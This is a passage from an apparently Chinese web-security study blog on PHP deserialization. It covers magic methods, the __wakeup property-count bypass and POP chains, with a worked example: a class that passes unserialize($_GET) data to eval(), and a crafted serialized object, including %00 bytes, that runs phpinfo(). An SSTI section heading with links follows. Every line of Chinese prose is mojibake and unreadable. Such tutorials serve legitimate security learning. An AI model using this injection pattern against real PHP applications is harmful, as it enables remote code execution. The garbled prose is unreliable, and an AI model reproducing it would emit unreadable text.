class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡è½½åºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// è¿”å›éœ€è¦åºåˆ—åŒ–çš„å˜é‡åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œåºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>sleep()å‡½æ•°ï¼Œä¸Šé¢</strong>sleepçš„å‡½æ•°ä½œç”¨æ˜¯è¿‡æ»¤æ‰passwordçš„å˜é‡å€¼ã€‚</p>
<hr>
<h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h5><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p>
<p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ååºåˆ—åŒ–åè°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>wakeup()å‡½æ•°ï¼Œä¸Šé¢</strong>wakeupçš„å‡½æ•°ä½œç”¨æ˜¯å°†usernameçš„å˜é‡å€¼èµ‹å€¼ç»™passwordå˜é‡ã€‚</p>
<hr>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><p><strong>__toString()</strong> æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__toString</span><br></pre></td></tr></table></figure></div>

<p>ç‰¹åˆ«æ³¨æ„__toStringçš„è§¦å‘æ¡ä»¶ï¼Œå¼•ç”¨k0rz3nå¸ˆå‚…çš„ç¬”è®°ï¼š</p>
<blockquote>
<p>(1)echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ (2)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ (3)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ (4)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ (5)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ (6)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ (7)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ (8)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</p>
</blockquote>
<hr>
<h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<code>__invoke()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚(æœ¬ç‰¹æ€§åªåœ¨ PHP 5.1.0 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰æ•ˆã€‚)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure></div>

<hr>
<h5 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h5><p>å½“ä½¿ç”¨ clone å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• <code>__clone()</code> ï¼Œå¦‚æœè¯¥é­”æœ¯æ–¹æ³•å­˜åœ¨çš„è¯ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="wakeup-å‡½æ•°æ¼æ´åŸç†"><a href="#wakeup-å‡½æ•°æ¼æ´åŸç†" class="headerlink" title="__wakeup()å‡½æ•°æ¼æ´åŸç†"></a>__wakeup()å‡½æ•°æ¼æ´åŸç†</h4><p><code>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p>
<p><code>ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p>
<h4 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h4><p>å®é™…ç¯å¢ƒä¸­ä¸å¯èƒ½å­˜åœ¨ç›´æ¥ååºåˆ—åŒ–å°±èƒ½å®ç°å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ç”¨åˆ°æˆ‘ä»¬åˆšå­¦åˆ°çš„ä¸€äº›<code>é­”æœ¯æ–¹æ³•</code>çš„ç›¸äº’è§¦å‘ï¼Œæ¥æ„é€ ä¸€æ¡popchainï¼Œä»ååºåˆ—åŒ–æ¥å£å¼€å§‹ï¼Œ<strong>ä¸€çº§ä¸€çº§çš„è§¦å‘</strong>ã€æ‰€ä»¥å°±éœ€è¦æ¸…æ¥šå„ä¸ªé­”æœ¯æ–¹æ³•çš„è§¦å‘æƒ…å†µã€‘ï¼Œæœ€ç»ˆåˆ°è¾¾æˆ‘ä»¬ç›®çš„æƒ³è¦æ‰§è¡Œçš„<code>æ–¹æ³•/å‡½æ•°</code></p>
<hr>
<h4 id="ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"><a href="#ä¸ªäºº-ä¸€äº›æ–‡ç« å¯¹-phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥" class="headerlink" title="*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥"></a>*ä¸ªäºº+ä¸€äº›æ–‡ç« å¯¹ phpååºåˆ—åŒ–çš„ä¸€äº›è®¤çŸ¥</h4><p>ä¸¾ä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>



<p>æ­£å¸¸å®ä¾‹åŒ–åä¼šæ‰§è¡Œ<code>normal</code>ç±»é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>unserialize</code>å‡½æ•°æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¿›è¡Œæ”»å‡»ï¼Œæ€è·¯å°±æ˜¯æ”¹å˜<code>index</code>ç±»é‡Œé¢<code>test</code>å±æ€§çš„å€¼ï¼Œè®©å®ƒå®ä¾‹åŒ–<code>evil</code>ç±»ï¼Œä»è€Œæ‰§è¡Œ<code>evil</code>é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿè¦ä¿®æ”¹<code>evil</code>ç±»é‡Œé¢çš„<code>test2</code>å±æ€§çš„å€¼</p>
<hr>
<p>å› ä¸º<code>ç±»ä¸åŒäºå‡½æ•°</code>ï¼Œ<code>å®šä¹‰å®Œä¹‹åæ— æ³•ç›´æ¥ä½¿ç”¨</code>ï¼Œå› ä¸ºç±»<code>åªæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µ</code>ï¼Œ<u><strong>éœ€è¦é€šè¿‡å…³é”®å­—newæ¥å®ä¾‹åŒ–ç±»ï¼Œæ‰å¯ä»¥ä½¿ç”¨</strong></u>ã€‚ç±»å®ä¾‹åŒ–çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š<strong>å˜é‡å=new ç±»åï¼ˆ[æ„é€ å‡½æ•°]ï¼‰</strong>ã€‚</p>
<p>å…¶ä¸­ï¼Œå˜é‡åå¯ä»¥ä¸º<strong>ä»»ä½•PHPå˜é‡çš„åç§°</strong>ï¼Œæ„é€ å‚æ•°å–å†³äº<strong>ç±»çš„æ„é€ å‡½æ•°</strong>ï¼Œè‹¥<strong>æ— æ„é€ å‡½æ•°ï¼Œåˆ™åœ†æ‹¬å·ä¸­ä¸ºç©º</strong>ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">å®ä¾‹åŒ–ä¸€ä¸ªç±»åå³å¯ä½¿ç”¨è¯¥ç±»</span><br></pre></td></tr></table></figure>

<hr>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>



<p>è¿™é‡ŒååºåŒ–çš„ï¼Œå…ˆæ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure></div>

<p>å®ä¾‹åŒ–index()ç±»ï¼Œç„¶åè°ƒåŠ¨å…¶<code>test</code>å˜é‡å®ä¾‹åŒ–<code>evil)()</code>ï¼Œ</p>
<p>ä½¿å…¶èƒ½å¤Ÿè¢«è°ƒç”¨ï¼Œç„¶åæ ¹æ®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯¹<code>test2</code>å˜é‡è¿›è¡Œèµ‹å€¼å‘½ä»¤è¯­å¥ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„<code>eval</code>å‡½æ•°ï¼Œæ‰§è¡Œä¸€äº›å‘½ä»¤æ¥æ‹¿åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>æœ€åå¯¹åºåˆ—åŒ–çš„<strong>å…¥å£ç±»</strong>(<code>index.php</code>)åºåˆ—åŒ–ï¼Œç„¶åæŠŠåºåˆ—åŒ–ç»“æœå¯¼å…¥ï¼Œå†ç”±æºç ä¸­ååºåˆ—åŒ–å‡½æ•°åï¼Œä»è€Œå®ç°æˆ‘ä»¬æƒ³è¦çš„ç»“æ„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä»¥<code>GET</code>æ–¹å¼ä¼ å‚<code>test</code>å‚æ•°ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=åºåˆ—åŒ–ç»“æœ</span><br></pre></td></tr></table></figure></div>



<p><strong>ä½†æ˜¯åºåˆ—åŒ–çš„ç»“æœæœªå¿…éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸º<code>%00</code>è¿™ä¸ªç©ºå­—ç¬¦æ˜¯æ— æ³•æ˜¾ç¤ºï¼Œåªèƒ½è¾“å…¥è¿›å»</strong></p>
<p>ä»¥ä¸Šé¢ä¸ºä¾‹å­ï¼Œåºåˆ—åŒ–åç»“æœä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœç”¨äº†è¿™ä¸ªæ˜¯ä¼šæŠ¥é”™çš„ï¼Œ</p>
<p><img src="/2022/05/28/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></p>
<p>å› ä¸ºè¿™é‡Œçš„å‚æ•°æœ‰é—®é¢˜</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬ä»”ç»†çœ‹ä¸€ä¸‹å±æ€§å€¼æ˜¯<code>11</code>ï¼Œä½†æ˜¯åé¢çš„<code>indextest</code>æ€»å…±æ˜¯<code>9</code>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸¢å¤±äº†ä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦å°±æ˜¯ç©ºå­—ç¬¦<code>%00</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæˆ‘ä»¬åŠ ä¸Šåå†è¯•è¯•</p>
<p><img src="/2022/05/28/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></p>
<p>å°±å®ç°äº†æˆ‘ä»¬çš„ç›®çš„æ“ä½œ</p>
<p>å½“ç„¶å…¶å®è¿˜å¯èƒ½æœ‰çš„æƒ…å†µåé¢ä¸æ˜¯<code>eval()</code>çš„å‘½ä»¤æ‰§è¡Œï¼Œå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæˆ–è€…å…¶ä»–æ“ä½œï¼ŒæŒ‰è¿™ç§æ€è·¯èµ°å¤§éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p>
<hr>
<h3 id="åäºŒã€ssti"><a href="#åäºŒã€ssti" class="headerlink" title="åäºŒã€ssti"></a>åäºŒã€ssti</h3><p>æ ¹æ®ä¸‹å›¾ï¼Œæ¨æµ‹ä¸åŒçš„æ¨¡æ¿æ³¨å…¥ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„æ³¨å…¥æ–¹æ³•</p>
<p><img src="/2022/05/28/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p>
<p><img src="/2022/05/28/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p>
<p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">åŸæ–‡é“¾æ¥1</a></p>
<p><a href="https://www.freebuf.com/articles/network/219913.html">åŸæ–‡é“¾æ¥2</a></p>
